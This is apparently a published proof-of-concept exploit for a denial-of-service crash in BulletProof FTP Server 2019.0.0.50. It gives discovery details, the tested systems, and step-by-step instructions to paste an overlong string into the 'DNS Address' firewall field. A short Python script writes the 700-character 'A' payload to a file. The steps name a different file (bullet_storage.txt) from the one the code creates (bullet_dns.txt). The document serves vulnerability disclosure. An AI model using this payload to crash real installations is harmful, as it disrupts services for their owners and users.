#Exploit Title: BulletProof FTP Server 2019.0.0.50 - 'DNS Address' Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-05-18
#Vendor Homepage: http://bpftpserver.com/
#Software Link: http://bpftpserver.com/products/bpftpserver/windows/download
#Tested Version: 2019.0.0.50
#Tested on: Windows 10 Single Language x64 / Windows 7 Service Pack 1 x64

#Steps to produce the crash:
#1.- Run python code: BulletProof_DNS_Server_2019.0.0.50.py
#2.- Open bullet_storage.txt and copy content to clipboard
#3.- Open BulletProof FTP Server
#4.- Select "Settings" > "Protocols" > "FTP" > "Firewall"
#5.- Enable "DNS Address" and Paste Clipboard
#6.- Click on "Test"
#7.- Crashed

cod = "\x41" * 700

f = open('bullet_dns.txt', 'w')
f.write(cod)
f.close()